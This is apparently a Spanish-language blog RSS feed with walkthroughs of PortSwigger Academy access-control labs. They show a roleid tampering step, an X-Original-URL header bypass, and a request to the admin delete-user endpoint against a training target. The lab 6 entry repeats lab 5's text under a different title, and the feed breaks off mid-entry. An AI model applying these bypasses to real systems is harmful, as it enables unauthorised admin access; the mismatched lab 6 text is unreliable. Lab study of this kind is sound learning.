<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>A1ux</title>
        <link>https://www.alux.cc/</link>
        <description>Recent content on A1ux</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>es-GT</language>
        <lastBuildDate>Fri, 17 Dec 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.alux.cc/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Portswigger Academy Learning Path: Access Control Lab 4</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/</link>
        <pubDate>Fri, 17 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: Access Control Lab 4" /&gt;&lt;h1 id=&#34;lab-user-role-can-be-modified-in-user-profile&#34;&gt;Lab: User role can be modified in user profile&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar un bypass al control de seguridad que tienen los accesos de los usuarios.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Cuando entramos tenemos la siguiente web.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 121; 
			flex-basis: 291px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/web.png&#34; data-size=&#34;1729x1424&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/web.png&#34;
			width=&#34;1729&#34;
			height=&#34;1424&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Existe una funcionalidad de administracion en la cual podemos entrar con el usuario &lt;code&gt;wiener:peter&lt;/code&gt; pero si entramos a esa ruta no podemos acceder nos sale la siguiente alerta:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Admin interface only available if logged in as an administrator&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 317; 
			flex-basis: 762px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request.png&#34; data-size=&#34;1411x444&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request.png&#34;
			width=&#34;1411&#34;
			height=&#34;444&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request_hucb1f292b3a15e723e2b7611bda934a72_71345_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request_hucb1f292b3a15e723e2b7611bda934a72_71345_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request para cambio de mail&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request para cambio de mail&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Notamos que en la respuesta existe un parametro llamado &lt;code&gt;roleid&lt;/code&gt; y que tiene el valor 1 y con el nuevo correo que  tenemos, eso quiere decir que podriamos intentar modificar el valor del &lt;code&gt;roleid&lt;/code&gt; a &lt;code&gt;2&lt;/code&gt; y ver que pasa.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 290; 
			flex-basis: 698px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request2.png&#34; data-size=&#34;1539x529&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request2.png&#34;
			width=&#34;1539&#34;
			height=&#34;529&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request2_hu9b74af340c2d57eb7952352529bf4695_77189_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/request2_hu9b74af340c2d57eb7952352529bf4695_77189_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Peticion para cambiar el valor del rol&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Peticion para cambiar el valor del rol&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora que lo hemos cambiado no se ha denegado y nos muestra el nuevo role que contamos e intentamos acceder a la funcionalidad de admin sin problemas&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 299; 
			flex-basis: 717px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/admin.png&#34; data-size=&#34;1794x600&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/admin.png&#34;
			width=&#34;1794&#34;
			height=&#34;600&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/admin_hud3c372659d78a0316760202e54d4606d_61975_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/admin_hud3c372659d78a0316760202e54d4606d_61975_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Perfil de Administracion sin control de acceso&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Perfil de Administracion sin control de acceso&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y eliminamos al usuario carlos y resolvemos el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 241; 
			flex-basis: 579px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/resuelto.png&#34; data-size=&#34;1780x737&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/resuelto.png&#34;
			width=&#34;1780&#34;
			height=&#34;737&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/resuelto_hu3204950584d2719279ab3960432d89ff_84844_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-4/resuelto_hu3204950584d2719279ab3960432d89ff_84844_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Access Control Lab 5</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/</link>
        <pubDate>Fri, 17 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: Access Control Lab 5" /&gt;&lt;h1 id=&#34;lab-url-based-access-control-can-be-circumvented&#34;&gt;Lab: URL-based access control can be circumvented&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar un bypass al control de seguridad que tienen los accesos de los usuarios.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Cuando entramos tenemos la siguiente web.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 166; 
			flex-basis: 400px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/web.png&#34; data-size=&#34;1794x1075&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/web.png&#34;
			width=&#34;1794&#34;
			height=&#34;1075&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/web_hu4133aee039c2d038a0efa3d2e02510a6_748605_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/web_hu4133aee039c2d038a0efa3d2e02510a6_748605_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;En este caso la aplicacion cuando intentamos entrar a la opcion de administracion nos deniega el acceso definitivamente.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Pero podemos bypassear esto por medio de headers como&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Original-URL
X-Rewrite-URL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Si los agregamos a la solicitud podemos notar como podemos acceder a la funcionalidad de admin aunque anteriormente saliera un error de &lt;code&gt;acceso denegado&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 179; 
			flex-basis: 430px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request.png&#34; data-size=&#34;1531x854&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request.png&#34;
			width=&#34;1531&#34;
			height=&#34;854&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request_hu06c0f5eaf33c4c903c02adf70f755e2c_124633_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request_hu06c0f5eaf33c4c903c02adf70f755e2c_124633_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Agregar header de X-Original-URL para bypass&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Agregar header de X-Original-URL para bypass&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora notamos que podemos eliminar al usuario carlos haciendo una peticion &lt;code&gt;GET&lt;/code&gt; a &lt;code&gt;/admin/delete?username=carlos&lt;/code&gt; pero cuando lo intentamos sale el siguiente error:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 238; 
			flex-basis: 572px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request2.png&#34; data-size=&#34;1191x499&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request2.png&#34;
			width=&#34;1191&#34;
			height=&#34;499&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request2_hudab507ede568cf072570da13d734e6fa_68561_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request2_hudab507ede568cf072570da13d734e6fa_68561_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request para eliminar al usuario carlos pero erroneamente&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request para eliminar al usuario carlos pero erroneamente&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;La correcta manera es la siguiente es enviar en la peticion &lt;code&gt;GET&lt;/code&gt; los parametros para eliminar y en el header agregado solamente el path de la pagina al que se le hace el delete y la respuesta no nos da ningun error por lo que se ejecuto correctamente.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 221; 
			flex-basis: 531px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request3.png&#34; data-size=&#34;1080x488&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request3.png&#34;
			width=&#34;1080&#34;
			height=&#34;488&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request3_hud9086bbebb67666f3155ac6719b78aa1_64624_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/request3_hud9086bbebb67666f3155ac6719b78aa1_64624_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request para eliminar el usuario carlos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request para eliminar el usuario carlos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con eso ya nos salta la alerta de que hemos eliminado al usuario y resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 154; 
			flex-basis: 369px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/resuelto.png&#34; data-size=&#34;1799x1168&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/resuelto.png&#34;
			width=&#34;1799&#34;
			height=&#34;1168&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/resuelto_huc36cc13a5a4ecaa3d3ccc32f14b2895a_768741_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-5/resuelto_huc36cc13a5a4ecaa3d3ccc32f14b2895a_768741_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Access Control Lab 6</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/</link>
        <pubDate>Fri, 17 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/head.png" alt="Featured image of post Portswigger Academy Learning Path: Access Control Lab 6" /&gt;&lt;h1 id=&#34;lab-method-based-access-control-can-be-circumvented&#34;&gt;Lab: Method-based access control can be circumvented&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar un bypass al control de seguridad que tienen los accesos de los usuarios.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Cuando entramos tenemos la siguiente web.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 166; 
			flex-basis: 400px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/web.png&#34; data-size=&#34;1794x1075&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/web.png&#34;
			width=&#34;1794&#34;
			height=&#34;1075&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/web_hu4133aee039c2d038a0efa3d2e02510a6_748605_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/web_hu4133aee039c2d038a0efa3d2e02510a6_748605_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;En este caso la aplicacion cuando intentamos entrar a la opcion de administracion nos deniega el acceso definitivamente.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Pero podemos bypassear esto por medio de headers como&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Original-URL
X-Rewrite-URL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Si los agregamos a la solicitud podemos notar como podemos acceder a la funcionalidad de admin aunque anteriormente saliera un error de &lt;code&gt;acceso denegado&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 179; 
			flex-basis: 430px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request.png&#34; data-size=&#34;1531x854&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request.png&#34;
			width=&#34;1531&#34;
			height=&#34;854&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request_hu06c0f5eaf33c4c903c02adf70f755e2c_124633_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request_hu06c0f5eaf33c4c903c02adf70f755e2c_124633_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Agregar header de X-Original-URL para bypass&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Agregar header de X-Original-URL para bypass&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Ahora notamos que podemos eliminar al usuario carlos haciendo una peticion &lt;code&gt;GET&lt;/code&gt; a &lt;code&gt;/admin/delete?username=carlos&lt;/code&gt; pero cuando lo intentamos sale el siguiente error:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 238; 
			flex-basis: 572px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request2.png&#34; data-size=&#34;1191x499&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request2.png&#34;
			width=&#34;1191&#34;
			height=&#34;499&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request2_hudab507ede568cf072570da13d734e6fa_68561_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request2_hudab507ede568cf072570da13d734e6fa_68561_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request para eliminar al usuario carlos pero erroneamente&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request para eliminar al usuario carlos pero erroneamente&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;La correcta manera es la siguiente es enviar en la peticion &lt;code&gt;GET&lt;/code&gt; los parametros para eliminar y en el header agregado solamente el path de la pagina al que se le hace el delete y la respuesta no nos da ningun error por lo que se ejecuto correctamente.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 221; 
			flex-basis: 531px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request3.png&#34; data-size=&#34;1080x488&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request3.png&#34;
			width=&#34;1080&#34;
			height=&#34;488&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request3_hud9086bbebb67666f3155ac6719b78aa1_64624_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/request3_hud9086bbebb67666f3155ac6719b78aa1_64624_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Request para eliminar el usuario carlos&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Request para eliminar el usuario carlos&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Y con eso ya nos salta la alerta de que hemos eliminado al usuario y resuelto el lab.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 154; 
			flex-basis: 369px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/resuelto.png&#34; data-size=&#34;1799x1168&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/resuelto.png&#34;
			width=&#34;1799&#34;
			height=&#34;1168&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/resuelto_huc36cc13a5a4ecaa3d3ccc32f14b2895a_768741_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-6/resuelto_huc36cc13a5a4ecaa3d3ccc32f14b2895a_768741_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: Access Control Lab 1</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/</link>
        <pubDate>Thu, 16 Dec 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/head.png" alt="Featured image of post Portswigger Academy Learning Path: Access Control Lab 1" /&gt;&lt;h1 id=&#34;lab-unprotected-admin-functionality&#34;&gt;Lab: Unprotected admin functionality&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder realizar un bypass al control de seguridad que tienen los accesos de los usuarios.&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Cuando entramos tenemos la siguiente web.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 121; 
			flex-basis: 291px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/web.png&#34; data-size=&#34;1729x1424&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/web.png&#34;
			width=&#34;1729&#34;
			height=&#34;1424&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/web_hu9a6d0595ba51686ba86d9c1806114031_1632350_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Web&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Web&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Debemos de buscar el modulo de administracion para poder acceder en el y ver si la aplicacion no valida los permisos necesarios.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 383; 
			flex-basis: 919px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/robots.png&#34; data-size=&#34;640x167&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/robots.png&#34;
			width=&#34;640&#34;
			height=&#34;167&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/robots_hu7bf59e851f4a0d9d618ab22185782ba4_13738_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/robots_hu7bf59e851f4a0d9d618ab22185782ba4_13738_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Archivo robots&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Archivo robots&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;Ahora sabemos que exista esta pagina accedemos y vemos si podemos entrar sin los permisos necesarios.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 298; 
			flex-basis: 717px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/admin.png&#34; data-size=&#34;1764x590&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-access-control-lab-1/admin.png&#34;
			width=&#34;1764&#34;
			height=&#34;590&#34;
